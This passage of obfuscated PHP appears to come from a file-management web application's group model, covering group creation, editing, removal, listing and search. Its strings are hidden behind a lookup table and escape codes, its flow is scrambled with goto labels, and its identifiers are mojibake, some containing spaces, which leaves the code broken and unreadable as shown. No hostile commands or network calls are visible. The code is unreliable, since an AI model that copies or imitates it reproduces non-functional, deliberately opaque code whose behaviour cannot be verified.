Backup::get(); $b ËêÖ¸ƒ = $AË ¼â ã£[$_SERVER[¢à][278]][$_SERVER[¢à][164]][$_SERVER[¢à][415]]; $e¨øÚôÕ©í = array($_SERVER[¢à][416] => array($_SERVER[¢à][734], $b ËêÖ¸ƒ), $_SERVER[¢à][735] => array($_SERVER[¢à][316], $AË ¼â ã£[$_SERVER[¢à][691]])); goto a—‰…ŒÊ; e¢ °‡²èÈ: $a¿½Á²öŒ = $b„¯¿ÃîÑÕ ? 1 : 0; $d‹ƒï„–¸í = array($_SERVER[¢à][750] => 1, $_SERVER[¢à][703] => time(), $_SERVER[¢à][709] => $a¿½Á²öŒ, $_SERVER[¢à][747] => $b ËêÖ¸ƒ, $_SERVER[¢à][739] => $A÷¡ÄŞØ“Ù, $_SERVER[¢à][738] => $D‹§îëÀÔ§); if ($D’ £ª‡Š ) { $d‹ƒï„–¸í[$_SERVER[¢à][748]] = $BÎ…˜³ì‘; $d‹ƒï„–¸í[$_SERVER[¢à][749]] = $bÎ×À„±ê¤; } goto C¯Œ¿Úæ¡ˆ; Dì„„ñÆ¾‰: } private function _fileExist($c‚¹­¼†š, &$d’Ş®õ«›¤, $BĞµñéòÍ) { goto CôñĞ«˜; Aİ Ø§Œ‡Ÿ: if (IO::exist($eÛ«ÙØ‚¦¡)) { $d’Ş®õ«›¤[] = $c‚¹­¼†š[$cé‡ôŸÊÚŸ[415]]; return !1; } $F¶ë³Õ‰ÛØ = array($cé‡ôŸÊÚŸ[743] => $c‚¹­¼†š[$cé‡ôŸÊÚŸ[743]], $cé‡ôŸÊÚŸ[75] => array($cé‡ôŸÊÚŸ[751], "{$eÛ«ÙØ‚¦¡}\45")); $FÕèå¼»â = Model($cé‡ôŸÊÚŸ[719])->where($F¶ë³Õ‰ÛØ)->field($cé‡ôŸÊÚŸ[416])->select(); goto f’öªí…Ñ; CôñĞ«˜: $cé‡ôŸÊÚŸ =& $_SERVER[¢à]; $dÇíô¹ç©î = $c‚¹­¼†š[$cé‡ôŸÊÚŸ[75]]; if (in_array($c‚¹­¼†š[$cé‡ôŸÊÚŸ[415]], $d’Ş®õ«›¤)) { return !1; } goto c¼˜î«åÒÀ; c¼˜î«åÒÀ: if (!in_array($c‚¹­¼†š[$cé‡ôŸÊÚŸ[743]], $BĞµñéòÍ)) { return !1; } if (IO::exist($dÇíô¹ç©î)) { return !0; } $eÛ«ÙØ‚¦¡ = get_path_father($dÇíô¹ç©î); goto Aİ Ø§Œ‡Ÿ; f’öªí…Ñ: $d’Ş®õ«›¤ = array_merge($d’Ş®õ«›¤, array_to_keyvalue($FÕèå¼»â, $cé‡ôŸÊÚŸ[33], $cé‡ôŸÊÚŸ[415])); return !1; goto f†Áøç½…„; f†Áøç½…„: } private function _fileFilter($F±ÍÁŠ÷«À) { $Fàéùˆ·¿Ş =& $_SERVER[¢à]; if (empty($F±ÍÁŠ÷«À)) { return; } $a¶©ËÊ„¨ô = array($Fàéùˆ·¿Ş[415] => array($Fàéùˆ·¿Ş[7], array_unique($F±ÍÁŠ÷«À))); $dá¹ªÜâ¡ = Model($Fàéùˆ·¿Ş[752])->where($a¶©ËÊ„¨ô)->field($Fàéùˆ·¿Ş[366])->select(); foreach ($dá¹ªÜâ¡ as $BãÛÃ‡ºï) { Model($Fàéùˆ·¿Ş[752])->remove($BãÛÃ‡ºï[$Fàéùˆ·¿Ş[366]], !1); } } private function storeIds() { $b±¶ãšõÔã =& $_SERVER[¢à]; $BŸÁº‰¤¾˜ = Model($b±¶ãšõÔã[704])->listData(); return array_to_keyvalue($BŸÁº‰¤¾˜, $b±¶ãšõÔã[33], $b±¶ãšõÔã[364]); } } goto F¦¸‹…ÆãĞ; bôÄÎ¸Ğã: class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\x70"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\x61\x6d\145" => "\147\x72\157\165\160\x5f\155\145\164\141", "\155\x65\164\141\x46\x69\x65\x6c\144" => "\x67\162\157\x75\x70\x49\104"); protected function cacheFunctionAlias($Bô¢ãÖÖî) { $d†³œøòÛ« =& $_SERVER[¢à]; return array($d†³œøòÛ«[2141] => array($Bô¢ãÖÖî[0], $d†³œøòÛ«[2142]), $d†³œøòÛ«[2143] => array($Bô¢ãÖÖî[0], $d†³œøòÛ«[2142])); } protected function getInfo($bÄ À·´ËÃ) { $eÙâÆĞ¥ËŠ = $this->getInfoSimple($bÄ À·´ËÃ); if (!$eÙâÆĞ¥ËŠ) { return !1; } return $this->_listDataApplyItem($eÙâÆĞ¥ËŠ); } protected function getInfoSimple($Bµ²ï–ÚÑ‚, $AÅ«õ‚å¨ì = false) { $dÜ›ğ¥ªĞ· =& $_SERVER[¢à]; if ($AÅ«õ‚å¨ì) { $d¡ñÄ¾ôÊ‹ = array($dÜ›ğ¥ªĞ·[2075] => intval($Bµ²ï–ÚÑ‚)); $A„¿õó´† = $this->where($d¡ñÄ¾ôÊ‹)->find(); return is_array($A„¿õó´†) ? $A„¿õó´† : array(); } return $this->cacheFunctionGet($dÜ›ğ¥ªĞ·[2144], $Bµ²ï–ÚÑ‚); } protected function groupAdd($e²ä–—¬’è) { goto cß¦¡½Ÿâá; A°¥¢ôÌ¹: $aŒÕÀÀ³Ú° = $this->add($CÈÂŸ¾Ö‚Ã); $this->setNamePinyin($aŒÕÀÀ³Ú°, $CÈÂŸ¾Ö‚Ã[$A‡ö½ÄÎË[28]]); Model($A‡ö½ÄÎË[1106])->groupRootAdd($aŒÕÀÀ³Ú°); goto e‰‹„¿¶³; cß¦¡½Ÿâá: $A‡ö½ÄÎË =& $_SERVER[¢à]; if (!$e²ä–—¬’è[$A‡ö½ÄÎË[457]] && isset($e²ä–—¬’è[$A‡ö½ÄÎË[2075]]) && $e²ä–—¬’è[$A‡ö½ÄÎË[2075]] == 1) { if ($fôê©‡¾İ = $this->getInfoSimple($e²ä–—¬’è[$A‡ö½ÄÎË[2075]], !0)) { return $e²ä–—¬’è[$A‡ö½ÄÎË[2075]]; } } else { $fôê©‡¾İ = $this->getInfoSimple($e²ä–—¬’è[$A‡ö½ÄÎË[457]]); if (!$fôê©‡¾İ) { return !1; } } $eìøøÃŒ•± = $A‡ö½ÄÎË[466]; goto d·˜–¹É¿; e‰‹„¿¶³: return $aŒÕÀÀ³Ú°; goto fÄáÓ×ÇÙË; d·˜–¹É¿: if ($fôê©‡¾İ[$A‡ö½ÄÎË[455]]) { $eìøøÃŒ•± = $fôê©‡¾İ[$A‡ö½ÄÎË[455]] . $fôê©‡¾İ[$A‡ö½ÄÎË[2075]] . $A‡ö½ÄÎË[47]; } $CÈÂŸ¾Ö‚Ã = array($A‡ö½ÄÎË[383] => $this->groupNameAuto($e²ä–—¬’è[$A‡ö½ÄÎË[457]], $e²ä–—¬’è[$A‡ö½ÄÎË[28]]), $A‡ö½ÄÎË[365] => $e²ä–—¬’è[$A‡ö½ÄÎË[457]], $A‡ö½ÄÎË[521] => $eìøøÃŒ•±, $A‡ö½ÄÎË[2145] => $e²ä–—¬’è[$A‡ö½ÄÎË[2059]], $A‡ö½ÄÎË[2146] => 0, $A‡ö½ÄÎË[2079] => 0); if (!empty($e²ä–—¬’è[$A‡ö½ÄÎË[2075]])) { $CÈÂŸ¾Ö‚Ã[$A‡ö½ÄÎË[2075]] = $e²ä–—¬’è[$A‡ö½ÄÎË[2075]]; } goto A°¥¢ôÌ¹; fÄáÓ×ÇÙË: } protected function groupEdit($cÕ¨¢…»×³, $a‡øæ Ó) { $C¥øõÊ£õ =& $_SERVER[¢à]; if (!empty($a‡øæ Ó[$C¥øõÊ£õ[457]])) { $fÏ„ìÁÛß¶ = $this->getInfoSimple($cÕ¨¢…»×³); $bšÙèË†» = $this->getInfoSimple($a‡øæ Ó[$C¥øõÊ£õ[457]]); if (!$fÏ„ìÁÛß¶ || !$bšÙèË†») { return !1; } if ($fÏ„ìÁÛß¶[$C¥øõÊ£õ[2075]] == $bšÙèË†»[$C¥øõÊ£õ[2075]]) { return !1; } if ($a‡øæ Ó[$C¥øõÊ£õ[457]] != $fÏ„ìÁÛß¶[$C¥øõÊ£õ[457]]) { if ($bšÙèË†»[$C¥øõÊ£õ[455]] !== $fÏ„ìÁÛß¶[$C¥øõÊ£õ[455]] && strpos($bšÙèË†»[$C¥øõÊ£õ[455]], $fÏ„ìÁÛß¶[$C¥øõÊ£õ[455]] . $fÏ„ìÁÛß¶[$C¥øõÊ£õ[2075]] . $C¥øõÊ£õ[47]) === 0) { return !1; } $a‡øæ Ó[$C¥øõÊ£õ[521]] = $bšÙèË†»[$C¥øõÊ£õ[455]] . $a‡øæ Ó[$C¥øõÊ£õ[457]] . $C¥øõÊ£õ[47]; $this->_changeChildLevel($fÏ„ìÁÛß¶, $bšÙèË†»); } } if (isset($a‡øæ Ó[$C¥øõÊ£õ[28]])) { $this->setNamePinyin($cÕ¨¢…»×³, $a‡øæ Ó[$C¥øõÊ£õ[28]]); } return $this->where(array($C¥øõÊ£õ[2147] => $cÕ¨¢…»×³))->save($a‡øæ Ó); } private function _changeChildLevel($f±ö´†®Ü¬, $f‡‹’ÛÅ, $a¾§èÒŒÉÈ = false) { goto B×—ÃÊÉÃ‚; f§÷íáåõ‚: if ($a¾§èÒŒÉÈ) { $FØƒÍŠÌÓÏ = $f‡‹’ÛÅ[$cŞ÷êÎŞ˜[455]] . $f‡‹’ÛÅ[$cŞ÷êÎŞ˜[2075]] . $cŞ÷êÎŞ˜[47]; } $BñëŠ›µ± = array($cŞ÷êÎŞ˜[521] => array($cŞ÷êÎŞ˜[479], $f±ö´†®Ü¬[$cŞ÷êÎŞ˜[455]] . $f±ö´†®Ü¬[$cŞ÷êÎŞ˜[2075]] . $cŞ÷êÎŞ˜[480])); $Eò¼”Ì¯‹ó = array($cŞ÷êÎŞ˜[521] => array($cŞ÷êÎŞ˜[530], "\x72\145\x70\x6c\141\143\x65\50\160\141\162\x65\156\x74\x4c\x65\166\x65\x6c\54\47{$cÇ½±»ÇÜ‹}\47\54\x27{$FØƒÍŠÌÓÏ}\x27\51")); goto dºç“œ¾«ë; dºç“œ¾«ë: $this->where($BñëŠ›µ±)->data($Eò¼”Ì¯‹ó)->save(); goto f™ø‹µƒÌÅ; B×—ÃÊÉÃ‚: $cŞ÷êÎŞ˜ =& $_SERVER[¢à]; $cÇ½±»ÇÜ‹ = $f±ö´†®Ü¬[$cŞ÷êÎŞ˜[455]] . $f±ö´†®Ü¬[$cŞ÷êÎŞ˜[2075]] . $cŞ÷êÎŞ˜[47]; $FØƒÍŠÌÓÏ = $f‡‹’ÛÅ[$cŞ÷êÎŞ˜[455]] . $f‡‹’ÛÅ[$cŞ÷êÎŞ˜[2075]] . $cŞ÷êÎŞ˜[47] . $f±ö´†®Ü¬[$cŞ÷êÎŞ˜[2075]] . $cŞ÷êÎŞ˜[47]; goto f§÷íáåõ‚; f™ø‹µƒÌÅ: } public function setNamePinyin($C³İĞöÑª, $Eí”œ¾¥Ğ¨ = false) { $bŞ§©ÖÙÛÜ =& $_SERVER[¢à]; if (!$Eí”œ¾¥Ğ¨) { $FÚ¯˜šøŒ« = $this->getInfoSimple($C³İĞöÑª); $Eí”œ¾¥Ğ¨ = $FÚ¯˜šøŒ«[$bŞ§©ÖÙÛÜ[28]]; } if (!Input::check($Eí”œ¾¥Ğ¨, $bŞ§©ÖÙÛÜ[524])) { $this->metaSet($C³İĞöÑª, $bŞ§©ÖÙÛÜ[412], null); $this->metaSet($C³İĞöÑª, $bŞ§©ÖÙÛÜ[411], null); return; } $dÍ‡¥å„™ñ = array($bŞ§©ÖÙÛÜ[412] => str_replace($bŞ§©ÖÙÛÜ[50], $bŞ§©ÖÙÛÜ[33], Pinyin::encode($Eí”œ¾¥Ğ¨)), $bŞ§©ÖÙÛÜ[411] => Pinyin::encode($Eí”œ¾¥Ğ¨, $bŞ§©ÖÙÛÜ[525])); $this->metaSet($C³İĞöÑª, $dÍ‡¥å„™ñ); } protected function groupRemove($B»èÍ¯’™à) { goto AÏƒĞëíÈÅ; AÏƒĞëíÈÅ: $EÉéÖÛœğÌ =& $_SERVER[¢à]; $f‹­õ²´…½ = array($EÉéÖÛœğÌ[2075] => $B»èÍ¯’™à); $D‰Ò°õ¹¤Ú = $this->where($f‹­õ²´…½)->find(); goto a‘œÎæÁ„; F´·ÊÄª©: Model($EÉéÖÛœğÌ[752])->groupRootRemove($B»èÍ¯’™à); return $this->where($f‹­õ²´…½)->delete(); goto bÈâ»ˆÛä; a‘œÎæÁ„: if (!$D‰Ò°õ¹¤Ú || $D‰Ò°õ¹¤Ú[$EÉéÖÛœğÌ[457]] == 0) { return !1; } $c´…¦´—² = $this->getInfoSimple($D‰Ò°õ¹¤Ú[$EÉéÖÛœğÌ[457]]); $this->_changeChildLevel($D‰Ò°õ¹¤Ú, $c´…¦´—², !0); goto BèÅœÔÎë“; BèÅœÔÎë“: $this->where(array($EÉéÖÛœğÌ[457] => $B»èÍ¯’™à))->save(array($EÉéÖÛœğÌ[457] => $D‰Ò°õ¹¤Ú[$EÉéÖÛœğÌ[457]])); Model($EÉéÖÛœğÌ[2148])->where($f‹­õ²´…½)->delete(); Model($EÉéÖÛœğÌ[2149])->where($f‹­õ²´…½)->delete(); goto F´·ÊÄª©; bÈâ»ˆÛä: } public function listData() { $b£ —¢—ò® = $this->_makeOrder()->selectPage(50); $this->_listDataApply($b£ —¢—ò®[$_SERVER[¢à][351]]); return $b£ —¢—ò®; } private function _makeOrder($C°¿Á«ã¦ = '') { goto e²ƒ•·Ú; e²ƒ•·Ú: $D¶™²‹‚¦Í =& $_SERVER[¢à]; $B¦š™š»´· = array($D¶™²‹‚¦Í[2075], $D¶™²‹‚¦Í[28], $D¶™²‹‚¦Í[2061], $D¶™²‹‚¦Í[184]); $d†ÍÇ´£’ = array($D¶™²‹‚¦Í[398] => $D¶™²‹‚¦Í[399], $D¶™²‹‚¦Í[400] => $D¶™²‹‚¦Í[401]); goto fòà‘œ“×; fòà‘œ“×: $d”Åœå••´ = Input::get($D¶™²‹‚¦Í[403], $D¶™²‹‚¦Í[7], $D¶™²‹‚¦Í[2147], $B¦š™š»´·); $bÅ¦œÚ«ˆó = Input::get($D¶™²‹‚¦Í[404], $D¶™²‹‚¦Í[7], $D¶™²‹‚¦Í[2150], array($D¶™²‹‚¦Í[2150], $D¶™²‹‚¦Í[400])); $bÅ¦œÚ«ˆó = $d†ÍÇ´£’[$bÅ¦œÚ«ˆó]; goto BÕƒµî—¡Ğ; BÕƒµî—¡Ğ: $C°¿Á«ã¦ = $C°¿Á«ã¦ . "{$d”Åœå••´}\x20{$bÅ¦œÚ«ˆó}\x2c\40\x67\x72\x6f\165\160\x49\x44\x20\141\163\143"; return $this->order($C°¿Á«ã¦); goto eôĞä£îÅ”; eôĞä£îÅ”: } public function listChild($D„»àÑÆ–·) { $D¸«†ºÓºÊ =& $_SERVER[¢à]; $bëğÂŞ³Ùò = $this->where(array($D¸«†ºÓºÊ[457] => $D„»àÑÆ–·))->_makeOrder()->selectPage(200); $this->_listDataApply($bëğÂŞ³Ùò[$D¸«†ºÓºÊ[351]]); return $bëğÂŞ³Ùò; } public function listByID($AÈ“”Âğ¢¹) { $C’ï®è‘¶† =& $_SERVER[¢à]; if (!$AÈ“”Âğ¢¹) { return array(); } $eî¾²¯ï…‘ = array($C’ï®è‘¶†[2075] => array($C’ï®è‘¶†[7], $AÈ“”Âğ¢¹)); $Føå¡º–× = $this->where($eî¾²¯ï…‘)->select(); $this->_listDataApply($Føå¡º–×); return $Føå¡º–×; } public function listSearch($fÍ“¤ÚëÀ·) { goto E­ğ’ÜİÑË; E­ğ’ÜİÑË: $e‹ÂÜ‰Š”… =& $_SERVER[¢à]; $F†ö•Ø´ù‘ = $fÍ“¤ÚëÀ·[$e‹ÂÜ‰Š”…[2151]]; $EÜ¬Í‰³óÂ = isset($fÍ“¤ÚëÀ·[$e‹ÂÜ‰Š”…[2152]]) ? $fÍ“¤ÚëÀ·[$e‹ÂÜ‰Š”…[2152]] : !1; goto C÷˜‰øÅ¡Ã; b¦ôß·Ô: $aåÃò‹¹à´ = $this->_makeOrder()->where($E…‰¤Û»¼)->selectPage(20); $aåÃò‹¹à´ = $aåÃò‹¹à´ ? $aåÃò‹¹à´ : array(); if (!$aåÃò‹¹à´ || count($aåÃò‹¹à´[$e‹ÂÜ‰Š”…[351]]) < 5 && Input::check($F†ö•Ø´ù‘, $e‹ÂÜ‰Š”…[303])) { $Fæë¶Ü’‰‚ = $this->_searchFromMeta($e‹ÂÜ‰Š”…[411], $F†ö•Ø´ù‘, 10); $D°‘Òœ±¼Ø = $this->_searchFromMeta($e‹ÂÜ‰Š”…[412], $F†ö•Ø´ù‘, 10); $b‹£Úš¶ = array_merge($Fæë¶Ü’‰‚, $D°‘Òœ±¼Ø, $aåÃò‹¹à´[$e‹ÂÜ‰Š”…[351]]); $aåÃò‹¹à´[$e‹ÂÜ‰Š”…[351]] = array_unique_by_key($b‹£Úš¶, $e‹ÂÜ‰Š”…[2075]); $aåÃò‹¹à´[$e‹ÂÜ‰Š”…[348]][$e‹ÂÜ‰Š”…[349]] = count($aåÃò‹¹à´[$e‹ÂÜ‰Š”…[351]]); $aåÃò‹¹à´[$e‹ÂÜ‰Š”…[348]][$e‹ÂÜ‰Š”…[350]] = ceil($aåÃò‹¹à´[$e‹ÂÜ‰Š”…[348]][$e‹ÂÜ‰Š”…[349]] / $aåÃò‹¹à´[$e‹ÂÜ‰Š”…[348]][$e‹ÂÜ‰Š”…[346]]); } goto FµÊ¾¨‘Ï; FµÊ¾¨‘Ï: $this->_listDataApply($aåÃò‹¹à´[$e‹ÂÜ‰Š”…[351]]); return $aåÃò‹¹à´; goto E˜š „‡À; C÷˜‰øÅ¡Ã: if (!trim($F†ö•Ø´ù‘)) { return !1; } $F†ö•Ø´ù‘ = str_replace($e‹ÂÜ‰Š”…[2153], $e‹ÂÜ‰Š”…[2154], $F†ö•Ø´ù‘); $E…‰¤Û»¼ = array($e‹ÂÜ‰Š”…[2075] => array($e‹ÂÜ‰Š”…[751], "\45{$F†ö•Ø´ù‘}\45"), $e‹ÂÜ‰Š”…[28] => array($e‹ÂÜ‰Š”…[751], "\x25{$F†ö•Ø´ù‘}\x25"), $e‹ÂÜ‰Š”…[912] => $e‹ÂÜ‰Š”…[2155]); goto b¦ôß·Ô; E˜š „‡À: } private function _searchFromMeta($dèø›¯´ƒ, $EŒîÖª¿¯à, $cê£ŞàªŠ) { goto B¢¤‰ğšòŠ; aƒöÍÏµì: $D…Âéˆá‰ë = Model($D¯º·¼Èø²[2156])->where($B§ŞÅÓ†©©)->limit($cê£ŞàªŠ)->select(); if (!$D…Âéˆá‰ë) { return array(); } $D…Âéˆá‰ë = array_to_keyvalue($D…Âéˆá‰ë, $D¯º·¼Èø²[33], $D¯º·¼Èø²[2075]); goto E¼ª’ªæ·; B¢¤‰ğšòŠ: $D¯º·¼Èø² =& $_SERVER[¢à]; $EŒîÖª¿¯à = strtolower($EŒîÖª¿¯à); $B§ŞÅÓ†©© = array($D¯º·¼Èø²[89] => $dèø›¯´ƒ, $D¯º·¼Èø²[356] => array($D¯º·¼Èø²[751], "\x25{$EŒîÖª¿¯à}\x25")); goto aƒöÍÏµì; E¼ª’ªæ·: $B®Û™Ìí„ = $this->where(array($D¯º·¼Èø²[2147] => array($D¯º·¼Èø²[7], $D…Âéˆá‰ë)))->select(); if (!$B®Û™Ìí„) { return array(); } return $B®Û™Ìí„; goto BšÀ¹¨ÎÀÎ; BšÀ¹¨ÎÀÎ: } protected function _listDataApplyItem($BŠÊ¬ÁÇÆÆ) { $Bêß£ÜÊ© = array($BŠÊ¬ÁÇÆÆ); $this->_listDataApply($Bêß£ÜÊ©); return $Bêß£ÜÊ©[0]; } protected function _listDataApply(&$Bô‘®Èçº) { goto FÂÔó…„ºø; D¥ò”ëÓÔ: $this->_listAppendParent($Bô‘®Èçº); $this->_listAppendSourceRoot($Bô‘®Èçº, $bë²÷ì¾); goto A³¡ê•Ãß‰; FÂÔó…„ºø: $D•ìÖŸùİ™ =& $_SERVER[¢à]; if (!$Bô‘®Èçº) { return; } $bë²÷ì¾ = array_to_keyvalue($Bô‘®Èçº, $D•ìÖŸùİ™[33], $D•ìÖŸùİ™[2075]); goto c‘ê­É§àî; c‘ê­É§àî: $this->_listAppendChildren($Bô‘®Èçº); $this->_listAppendChildrenMember($Bô‘®Èçº); $this->_listAppendMeta($Bô‘®Èçº, $bë²÷ì¾); goto D¥ò”ëÓÔ; A³¡ê•Ãß‰: } private function _listAppendChildren(&$A¢¬ ªğ¦¿) { goto e²Ÿ¹Ï¸¼À; e²Ÿ¹Ï¸¼À: $aªØ…®·ÍÛ =& $_SERVER[¢à]; $a²Ş‘êà‹ = $aªØ…®·ÍÛ[358]; $Fö²×ê¹´· = array(); goto A†Œ£ÂŠß–; A†Œ£ÂŠß–: $c±Ûçà†÷ = count($A¢¬ ªğ¦¿); $E”™ë…ÖË¤ = $this->tablePrefix . $this->tableName; for ($eôá©“Å­ = 0, $B¸Ë²Ì×ŒÅ = 0; $eôá©“Å­ < $c±Ûçà†÷; $eôá©“Å­++) { $B¸Ë²Ì×ŒÅ++; $B¸˜‹å¿Õ³ = $A¢¬ ªğ¦¿[$eôá©“Å­][$aªØ…®·ÍÛ[2075]]; $a²Ş‘êà‹ .= "\123\x45\x4c\105\x43\124\40\x2a\x20\x46\x52\117\x4d\40\50\123\105\114\105\103\124\40\x27{$B¸˜‹å¿Õ³}\137\x63\150\151\x6c\x64\x27\40\x61\163\40\150\x61\x73\x20\106\122\117\115\40\x60{$E”™ë…ÖË¤}\140\x20\167\150\x65\162\145\40\160\x61\x72\145\156\164\x49\x44\75{$B¸˜‹å¿Õ³}\x20\154\x69\155\x69\x74\x20\61\x29\40\x61\163\40\x74\142\x5f{$B¸˜‹å¿Õ³}\x20\165\x6e\151\x6f\x6e\40\x61\x6c\x6c\40"; if (($B¸Ë²Ì×ŒÅ >= 20 || $eôá©“Å­ == $c±Ûçà†÷ - 1) && $a²Ş‘êà‹) { $a²Ş‘êà‹ = substr($a²Ş‘êà‹, 0, -strlen($aªØ…®·ÍÛ[445])); $bƒÅ›É’‘È = $this->query($a²Ş‘êà‹); $Fö²×ê¹´· = array_merge($Fö²×ê¹´·, $bƒÅ›É’‘È); $B¸Ë²Ì×ŒÅ = 0; $a²Ş‘êà‹ = $aªØ…®·ÍÛ[33]; } } goto dî‚¾ÂÍ³Û; dî‚¾ÂÍ³Û: $Fö²×ê¹´· = array_to_keyvalue($Fö²×ê¹´·, $aªØ…®·ÍÛ[446]); foreach ($A¢¬ ªğ¦¿ as &$CÉ‚—ğ¯…ê) { $CÉ‚—ğ¯…ê[$aªØ…®·ÍÛ[2157]] = isset($Fö²×ê¹´·[$CÉ‚—ğ¯…ê[$aªØ…®·ÍÛ[2075]] . $aªØ…®·ÍÛ[2158]]); } goto eÈ°¶ƒ‚–Ã; eÈ°¶ƒ‚–Ã: } private function _listAppendChildrenMember(&$E®ôß—§ñ´) { goto bĞ›Ù·øöç; AØÔÚƒ„‡Ş: $e÷‹†¢–£› = array_to_keyvalue($e÷‹†¢–£›, $cå„îİÙª¾[446]); foreach ($E®ôß—§ñ´ as &$A·Ïß×¯‘ó) { $A·Ïß×¯‘ó[$cå„îİÙª¾[2159]] = isset($e÷‹†¢–£›[$A·Ïß×¯‘ó[$cå„îİÙª¾[2075]] . $cå„îİÙª¾[2158]]); } goto E‡ÛÇÒÛØŒ; bĞ›Ù·øöç: $cå„îİÙª¾ =& $_SERVER[¢à]; $C­éÁÏƒà£ = $cå„îİÙª¾[358]; $e÷‹†¢–£› = array(); goto A¤´¤ÚÔ —; A¤´¤ÚÔ —: $eğ»ÂŒİ = count($E®ôß—§ñ´); $fÆø³ôö¸ã = $this->tablePrefix . $cå„îİÙª¾[2149]; for ($BÔ£ÏÜôÑ‰ = 0, $Bß¥ß·ùâ¡ = 0; $BÔ£ÏÜôÑ‰ < $eğ»ÂŒİ; $BÔ£ÏÜôÑ‰++) { $Bß¥ß·ùâ¡++; $A›¢†­ôµ = $E®ôß—§ñ´[$BÔ£ÏÜôÑ‰][$cå„îİÙª¾[2075]]; $C­éÁÏƒà£ .= "\123\105\114\x45\x43\x54\x20\52\x20\x46\122\x4f\x4d\40\50\x53\105\x4c\105\103\124\x20\x27{$A›¢†­ôµ}\x5f\x63\x68\151\x6c\144\x27\40\141\163\40\150\x61\163\x20\106\122\117\115\40\x60{$fÆø³ôö¸ã}\x60\x20\167\150\145\162\145\x20\147\x72\157\165\160\111\104\75{$A›¢†­ôµ}\x20\154\x69\x6d\151\164\40\61\51\x20\x61\x73\x20\x74\142\137{$A›¢†­ôµ}\x20\165\156\x69\157\x6e\40\141\154\x6c\x20"; if (($Bß¥ß·ùâ¡ >= 20 || $BÔ£ÏÜôÑ‰ == $eğ»ÂŒİ - 1) && $C­éÁÏƒà£) { $C­éÁÏƒà£ = substr($C­éÁÏƒà£, 0, -strlen($cå„îİÙª¾[445])); $aé´ö²ƒˆš = $this->query($C­éÁÏƒà£); $e÷‹†¢–£› = array_merge($e÷‹†¢–£›, $aé´ö²ƒˆš); $Bß¥ß·ùâ¡ = 0; $C­éÁÏƒà£ = $cå„îİÙª¾[33]; } } goto AØÔÚƒ„‡Ş; E‡ÛÇÒÛØŒ: } private function _listAppendMeta(&$d…‰Á¤ÇÃ, $C£±¥“°õõ) { $fèò°ÆŒ© =& $_SERVER[¢à]; $c‹åœÒ©ÙŒ = array($fèò°ÆŒ©[2075] => array($fèò°ÆŒ©[7], $C£±¥“°õõ)); $dÙì¼·Â–Ğ = Model($fèò°ÆŒ©[2148])->where($c‹åœÒ©ÙŒ)->select(); $dÙì¼·Â–Ğ = array_to_keyvalue_group($dÙì¼·Â–Ğ, $fèò°ÆŒ©[2075]); foreach ($dÙì¼·Â–Ğ as &$aõ¡Ï„‹ˆò) { $aõ¡Ï„‹ˆò = array_to_keyvalue($aõ¡Ï„‹ˆò, $fèò°ÆŒ©[89], $fèò°ÆŒ©[356]); } foreach ($d…‰Á¤ÇÃ as &$F’â½´·á) { $F’â½´·á[$fèò°ÆŒ©[413]] = array(); if (isset($dÙì¼·Â–Ğ[$F’â½´·á[$fèò°ÆŒ©[2075]]])) { $F’â½´·á[$fèò°ÆŒ©[413]] = $dÙì¼·Â–Ğ[$F’â½´·á[$fèò°ÆŒ©[2075]]]; } } } protected function parentLevelArray($Dí©ñˆµŸ¼) { $EèŒƒ˜œˆË =& $_SERVER[¢à]; $Dí©ñˆµŸ¼ = explode($EèŒƒ˜œˆË[47], trim($Dí©ñˆµŸ¼, $EèŒƒ˜œˆË[47])); $Dí©ñˆµŸ¼ = array_remove_value($Dí©ñˆµŸ¼, $EèŒƒ˜œˆË[464]); return $Dí©ñˆµŸ¼; } private function _listAppendParent(&$CÌªœĞÍ™‹) { goto CĞï‰¨Åù‰; FÃ©·¢íâù: $e†¢ë•Î‚¸ = array(); foreach ($Dª«ÅÛÙÄ as $aó‰Ô‡éÈ° => $eùÀã§‘¬Œ) { if (!$eùÀã§‘¬Œ) { $e†¢ë•Î‚¸[] = $aó‰Ô‡éÈ°; } } if ($e†¢ë•Î‚¸) { $CÜÒ‰©¨ñ› = array($bÅì´¿¶í™[2147] => array($bÅì´¿¶í™[381], $e†¢ë•Î‚¸)); $c†‡Øé°àñ = $this->field($bÅì´¿¶í™[2160])->where($CÜÒ‰©¨ñ›)->select(); $CßÃÄ¨Š¬İ = array_to_keyvalue($c†‡Øé°àñ, $bÅì´¿¶í™[2075], $bÅì´¿¶í™[28]); $Dª«ÅÛÙÄ = array_merge_index($Dª«ÅÛÙÄ, $CßÃÄ¨Š¬İ); } goto EœÀóÁò”; CĞï‰¨Åù‰: $bÅì´¿¶í™ =& $_SERVER[¢à]; $Dª«ÅÛÙÄ = array(); foreach ($CÌªœĞÍ™‹ as &$AƒÜª®ÛŒ) { $Dª«ÅÛÙÄ[$AƒÜª®ÛŒ[$bÅì´¿¶í™[2075]]] = $AƒÜª®ÛŒ[$bÅì´¿¶í™[28]]; $CŸ†…‡¥é = $this->parentLevelArray($AƒÜª®ÛŒ[$bÅì´¿¶í™[455]]); foreach ($CŸ†…‡¥é as $f“åòÎí÷å) { if (!isset($Dª«ÅÛÙÄ[$f“åòÎí÷å])) { $Dª«ÅÛÙÄ[$f“åòÎí÷å] = 0; } } } goto FÃ©·¢íâù; EœÀóÁò”: foreach ($CÌªœĞÍ™‹ as &$AƒÜª®ÛŒ) { $CŸ†…‡¥é = $this->parentLevelArray($AƒÜª®ÛŒ[$bÅì´¿¶í™[455]]); $c•µ¤¡ÌÊ‚ = $bÅì´¿¶í™[33]; foreach ($CŸ†…‡¥é as $f“åòÎí÷å) { $c•µ¤¡ÌÊ‚ .= $Dª«ÅÛÙÄ[$f“åòÎí÷å] . $bÅì´¿¶í™[8]; } if ($CŸ†…‡¥é) { $c•µ¤¡ÌÊ‚ .= $AƒÜª®ÛŒ[$bÅì´¿¶í™[28]]; } $AƒÜª®ÛŒ[$bÅì´¿¶í™[459]] = str_replace($bÅì´¿¶í™[463], $bÅì´¿¶í™[8], $c•µ¤¡ÌÊ‚); } goto cí ª°ÚÌ–; cí ª°ÚÌ–: } private function _listAppendSourceRoot(&$cÇÊ–¶ŒƒÍ, $D‚ ëš¹ã) { goto D‡°®Ğ‘¿Õ; dŸÀÌ‘š…ï: $Cã¾Û¤à‡ = Model($fÕåÒ·Ä¼[752])->order($fÕåÒ·Ä¼[2162])->field($FƒÎÜ›Œª)->where($c–‹‚”ŒÀ¸)->select(); $Cã¾Û¤à‡ = array_to_keyvalue($Cã¾Û¤à‡, $fÕåÒ·Ä¼[452]); 